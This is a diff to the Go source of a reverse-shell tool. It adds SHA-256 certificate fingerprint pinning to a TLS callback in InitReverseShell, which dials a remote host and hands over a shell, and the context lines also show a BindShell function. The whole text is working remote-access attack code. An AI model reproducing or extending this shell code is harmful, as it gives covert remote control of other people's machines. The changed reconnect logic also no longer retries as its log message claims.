@@ -2,6 +2,8 @@ package core
 
 import (
 	"bufio"
+	"bytes"
+	"crypto/sha256"
 	"crypto/tls"
 	"fmt"
 	"log"
@@ -24,16 +26,25 @@ const (
 
 func InitReverseShell(connectString string, fingerprint []byte) {
 	config := &tls.Config{InsecureSkipVerify: true}
+
 	for {
 		var err error
-		myconn.Conn, err = tls.Dial("tcp", connectString, config)
+		tlsConn, err := tls.Dial("tcp", connectString, config)
 		if err != nil {
 			log.Printf("%s unreachable, trying agian in 5 seconds", connectString)
-		} else {
-			StartShell(&myconn.Conn)
+			break
 		}
-		time.Sleep(5 * time.Second)
+
+		ok := isValidKey(tlsConn, fingerprint)
+		if !ok {
+			os.Exit(ErrBadFingerprint)
+		}
+
+		myconn.Conn = tlsConn
+		StartShell(&myconn.Conn)
 	}
+
+	time.Sleep(5 * time.Second)
 }
 
 func StartShell(conn *myconn.Writer) {
@@ -111,4 +122,16 @@ func BindShell() {
 			}(conn)
 		}
 	}()
+}
+
+func isValidKey(conn *tls.Conn, fingerprint []byte) bool {
+	valid := false
+	connState := conn.ConnectionState()
+	for _, peerCert := range connState.PeerCertificates {
+		hash := sha256.Sum256(peerCert.Raw)
+		if bytes.Compare(hash[0:], fingerprint) == 0 {
+			valid = true
+		}
+	}
+	return valid
 }
